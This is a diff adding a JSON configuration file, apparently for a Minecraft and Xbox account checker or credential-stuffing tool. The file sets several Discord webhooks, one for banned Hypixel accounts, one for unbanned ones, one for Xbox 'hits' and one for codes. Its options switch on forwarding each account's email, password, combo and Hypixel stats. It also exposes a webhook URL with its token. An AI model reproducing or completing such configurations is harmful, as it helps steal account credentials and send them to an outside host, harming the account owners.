@@ -1,0 +1,18 @@
+{
+  "webhooks": {
+    "default_webhook": "https://discord.com/api/webhooks/1510970047021977781/pj6N8ZEEM8--GNojaJeJ9FW6SIka3LayJogSIAm9M7AQvP9pz-MVsfXCOKItki90YQIz",
+    "hypixel_unbanned_webhook": "https://discord.com/api/webhooks/1510970047021977781/pj6N8ZEEM8--GNojaJeJ9FW6SIka3LayJogSIAm9M7AQvP9pz-MVsfXCOKItki90YQIz",
+    "hypixel_banned_webhook": "https://discord.com/api/webhooks/1510970047021977781/pj6N8ZEEM8--GNojaJeJ9FW6SIka3LayJogSIAm9M7AQvP9pz-MVsfXCOKItki90YQIz",
+    "xbox_hits_webhook": "https://discord.com/api/webhooks/1510970047021977781/pj6N8ZEEM8--GNojaJeJ9FW6SIka3LayJogSIAm9M7AQvP9pz-MVsfXCOKItki90YQIz",
+    "xbox_codes": "https://discord.com/api/webhooks/1510970047021977781/pj6N8ZEEM8--GNojaJeJ9FW6SIka3LayJogSIAm9M7AQvP9pz-MVsfXCOKItki90YQIz"
+  },
+  "embed_options": {
+    "bot_name": true,
+    "include_email": true,
+    "include_password": true,
+    "include_hypixel": true,
+    "include_hypixel_stats": true,
+    "include_type": true,
+    "include_combo": true
+  }
+}
